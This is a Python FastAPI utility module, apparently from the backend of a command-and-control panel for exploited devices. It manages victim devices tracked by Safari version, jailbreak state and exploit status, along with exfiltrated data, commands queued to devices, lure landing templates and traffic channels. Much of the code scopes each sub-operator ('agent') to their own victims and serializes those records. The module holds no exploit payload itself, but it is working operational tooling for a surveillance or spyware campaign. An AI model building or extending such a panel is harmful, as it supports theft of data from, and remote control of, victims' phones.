from fastapi import Request, HTTPException
from fastapi.responses import JSONResponse
from typing import Optional, Any, Dict, List, Tuple
from datetime import datetime
from sqlalchemy.orm import Session

from ..database import Device, TrafficChannel, LandingTemplate, ExfilData, Command, DeviceGroup, Agent as AgentModel


def _resolve_agent_scope(db: Session, user) -> Tuple[str, Optional[int]]:
    if user is None:
        return "none", None
    role = getattr(user, "role", None) or ""
    role = (role or "").lower()
    if role == "admin":
        return "admin", None
    user_id = getattr(user, "id", None)
    username = getattr(user, "username", None)
    matched_agent_id: Optional[int] = None
    if role in ("agent", "operator"):
        if user_id:
            try:
                ag = db.query(AgentModel).filter(AgentModel.id == int(user_id)).first()
                if ag:
                    matched_agent_id = ag.id
            except Exception:
                pass
        if matched_agent_id is None and username:
            try:
                ag = db.query(AgentModel).filter(AgentModel.username == username).first()
                if ag:
                    matched_agent_id = ag.id
            except Exception:
                pass
    if matched_agent_id is not None:
        return "agent", matched_agent_id
    return "operator", None


def apply_agent_filter_device(query, db: Session, user, device_alias=None):
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return query
    target = device_alias if device_alias is not None else Device
    return query.filter(target.agent_id == aid)


def apply_agent_filter_channel(query, db: Session, user):
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return query
    return query.filter(TrafficChannel.agent_id == aid)


def apply_agent_filter_template(query, db: Session, user):
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return query
    return query.filter((LandingTemplate.agent_id == aid) | (LandingTemplate.agent_id.is_(None)))


def apply_agent_filter_group(query, db: Session, user):
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return query
    return query.filter((DeviceGroup.agent_id == aid) | (DeviceGroup.agent_id.is_(None)))


def apply_agent_filter_exfil(query, db: Session, user, join_device: bool = True):
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return query
    if join_device:
        return query.join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == aid)
    return query


def apply_agent_filter_command(query, db: Session, user, join_device: bool = True):
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return query
    if join_device:
        return query.join(Device, Command.device_uuid == Device.device_uuid).filter(Device.agent_id == aid)
    return query


def assert_owns_device(db: Session, user, device: Device) -> None:
    if device is None:
        return
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return
    if device.agent_id is None:
        raise HTTPException(status_code=403, detail="无权限访问该设备")
    if int(device.agent_id) != int(aid):
        raise HTTPException(status_code=403, detail="无权限访问该设备")


def _assert_owns_exfil(db: Session, user, exfil: ExfilData) -> None:
    if exfil is None:
        return
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return
    dev = db.query(Device).filter(Device.device_uuid == exfil.device_uuid).first()
    if not dev or dev.agent_id is None:
        raise HTTPException(status_code=403, detail="无权限访问该数据")
    if int(dev.agent_id) != int(aid):
        raise HTTPException(status_code=403, detail="无权限访问该数据")


def _assert_owns_channel(db: Session, user, channel: TrafficChannel) -> None:
    if channel is None:
        return
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return
    if channel.agent_id is None:
        raise HTTPException(status_code=403, detail="无权限访问该渠道")
    if int(channel.agent_id) != int(aid):
        raise HTTPException(status_code=403, detail="无权限访问该渠道")


def _assert_owns_template(db: Session, user, template: LandingTemplate) -> None:
    if template is None:
        return
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return
    if template.agent_id is None:
        return
    if int(template.agent_id) != int(aid):
        raise HTTPException(status_code=403, detail="无权限访问该模板")


def get_pagination_params(skip: int = 0, limit: int = 100, max_limit: int = 500):
    skip = max(0, int(skip))
    limit = min(max(1, int(limit)), max_limit)
    return skip, limit


def paginate_response(items: List[Any], total: int, skip: int, limit: int) -> Dict[str, Any]:
    return {
        "total": total,
        "items": items,
        "skip": skip,
        "limit": limit,
    }


def serialize_device(d: Device) -> dict:
    return {
        "id": d.id,
        "device_uuid": d.device_uuid,
        "first_seen": d.first_seen.isoformat() if d.first_seen else None,
        "last_seen": d.last_seen.isoformat() if d.last_seen else None,
        "ip": d.ip,
        "user_agent": d.user_agent,
        "status": d.status,
        "os_version": d.os_version,
        "safari_version": d.safari_version,
        "device_model": d.device_model,
        "hw_model": d.hw_model,
        "chipset": d.chipset,
        "jailbroken": d.jailbroken,
        "exploit_status": d.exploit_status,
        "last_command_time": d.last_command_time.isoformat() if d.last_command_time else None,
        "group_id": d.group_id,
        "note": d.note,
        "host": d.host,
        "referer": d.referer,
        "access_path": d.access_path,
        "ip_location": d.ip_location,
        "enabled": d.enabled,
        "channel_id": d.channel_id,
        "template_id": d.template_id,
        "agent_id": d.agent_id,
    }


def serialize_channel(c: TrafficChannel, db=None) -> dict:
    d = {
        "id": c.id,
        "slug": c.slug,
        "name": c.name,
        "api_key": c.api_key,
        "color": c.color or "#67c23a",
        "domain_whitelist": c.domain_whitelist,
        "default_template_id": c.default_template_id,
        "enabled": int(c.enabled if c.enabled is not None else 1),
        "visit_count": int(c.visit_count or 0),
        "device_count": int(c.device_count or 0),
        "note": c.note,
        "agent_id": c.agent_id,
        "created_at": c.created_at.isoformat() if c.created_at else None,
        "updated_at": c.updated_at.isoformat() if c.updated_at else None,
        "default_template_name": None,
        "default_template_slug": None,
    }
    if db and c.default_template_id:
        try:
            t = db.query(LandingTemplate).filter(LandingTemplate.id == int(c.default_template_id)).first()
            if t:
                d["default_template_name"] = t.name
                d["default_template_slug"] = t.slug
        except Exception:
            pass
    return d


def serialize_template(t: LandingTemplate) -> dict:
    return {
        "id": t.id,
        "slug": t.slug,
        "name": t.name,
        "category": t.category,
        "title": t.title,
        "description": t.description,
        "enabled": t.enabled,
        "visit_count": t.visit_count,
        "device_count": t.device_count,
        "agent_id": t.agent_id,
        "preview_url": t.preview_url,
        "created_at": t.created_at.isoformat() if t.created_at else None,
        "updated_at": t.updated_at.isoformat() if t.updated_at else None,
    }


def serialize_exfil(e: ExfilData) -> dict:
    return {
        "id": e.id,
        "device_uuid": e.device_uuid,
        "category": e.category,
        "path": e.path,
        "description": e.description,
        "file_path": e.file_path,
        "file_size": e.file_size,
        "data_json": e.data_json,
        "uploaded_at": e.uploaded_at.isoformat() if e.uploaded_at else None,
    }


def serialize_command(c: Command) -> dict:
    return {
        "id": c.id,
        "device_uuid": c.device_uuid,
        "command": c.command,
        "status": c.status,
        "output": c.output,
        "created_at": c.created_at.isoformat() if c.created_at else None,
        "executed_at": c.executed_at.isoformat() if c.executed_at else None,
    }


def serialize_group(g: DeviceGroup, db=None) -> dict:
    from sqlalchemy import func
    d = {
        "id": g.id,
        "name": g.name,
        "color": g.color or "#409EFF",
        "description": g.description or "",
        "agent_id": g.agent_id,
        "created_at": g.created_at.isoformat() if g.created_at else None,
        "updated_at": g.updated_at.isoformat() if g.updated_at else None,
        "device_count": 0,
    }
    if db is not None:
        try:
            d["device_count"] = db.query(func.count(Device.id)).filter(Device.group_id == g.id).scalar() or 0
        except Exception:
            pass
    return d


def add_cors_headers(request: Request, response: JSONResponse) -> JSONResponse:
    from .. import config
    origin = request.headers.get("origin")
    if origin:
        allowed = config.CORS_ORIGINS
        if "*" in allowed or origin in allowed:
            response.headers["Access-Control-Allow-Origin"] = origin
            response.headers["Access-Control-Allow-Credentials"] = "true"
            response.headers["Access-Control-Allow-Methods"] = "GET,POST,PUT,PATCH,DELETE,OPTIONS"
            response.headers["Access-Control-Allow-Headers"] = "*"
    return response
